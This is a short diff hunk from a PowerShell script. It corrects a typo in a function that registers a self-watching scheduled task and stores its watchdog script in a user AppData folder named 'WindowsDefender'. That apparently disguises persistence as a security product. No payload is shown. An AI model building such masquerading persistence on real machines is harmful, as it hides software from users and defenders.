@@ -408,7 +408,7 @@ try {
 }
 
 
-ffunction Register-SelfWatchTask {
+function Register-SelfWatchTask {
     $taskName = "ZiPo_SelfWatch"
     $watchScriptPath = "$env:APPDATA\WindowsDefender\watchdog.ps1"
     
